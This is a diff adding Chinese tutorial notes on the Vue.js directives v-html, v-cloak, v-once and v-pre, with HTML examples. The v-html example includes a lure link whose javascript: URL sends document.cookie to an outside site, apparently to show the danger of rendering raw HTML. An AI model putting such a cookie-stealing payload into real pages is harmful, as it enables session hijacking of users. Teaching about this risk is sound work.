@@ -192,4 +192,109 @@ vue分为两种模板语法，插值和指令。
 </body>
 ```
 
-# 
+### v-html
+
+用来更新元素的html，会按照原生html渲染，vue不会进行编译。
+
+```html
+<body>
+    <div id="root">
+        <div>你好，{{nmame}}</div>
+        <div v-html="str"></div>
+        <div v-html="str1"></div>
+    </div>
+    <script>
+        const vm = new Vue({
+            el: '#root',
+            data: {
+                name: 'shanla',
+                str: '<h3>你好啊！</h3>',
+                str1: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
+            }
+        })
+    </script>
+</body>
+```
+
+### v-cloak
+
+用来隐藏还未编译完成的DOM模板。
+
+有时候因为加载延时，例如卡掉了，数据没有及时刷新，就造成了页面显示从`{{name}}`到name变量“shanla” 的变化，这样闪动的变化，会造成用户体验不好。
+
+此时需要使用到`v-cloak`的这个标签。在vue解析之前，div属性中有`v-cloak`这个标签，在vue解析完成之后，v-cloak标签被移除。简单，类似div开始有一个css属性`display:none;`，加载完成之后，css属性变成`display:block`，元素显示出来。
+
+```html
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-cloak指令</title>
+    <style>
+        [v-cloak] {
+            display: none;
+        }
+    </style>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <h2 v-cloak>{{name}}</h2>
+    </div>
+    <script>
+        console.log(1)
+        new Vue({
+            el:'#root',
+            data:{
+                name:'shanla'
+            }
+        })
+    </script>
+</body>
+</html>
+```
+
+### v-once
+
+只渲染DOM或组件一次
+
+```html
+<body>
+    <div id="root">
+        <h2 v-once>初始化的n值是:{{n}}</h2>
+        <h2>当前的n值是:{{n}}</h2>
+        <button @click="n++">点我+1</button>
+    </div>
+    <script>
+        const vm = new Vue({
+            el: '#root',
+            data: {
+                n: 0
+            }
+        })
+    </script>
+</body>
+```
+
+### v-pre
+
+跳过元素或其子元素的编译
+
+```html
+<body>
+    <div id="root">
+        <h2 v-pre>{{n}}</h2>
+        <h2 >当前的n值是:{{n}}</h2>
+        <button @click="n++">点我n+1</button>
+    </div>
+    <script>
+        const vm = new Vue({
+            el: '#root',
+            data: {
+                n: 1
+            }
+        })
+    </script>
+</body>
+```
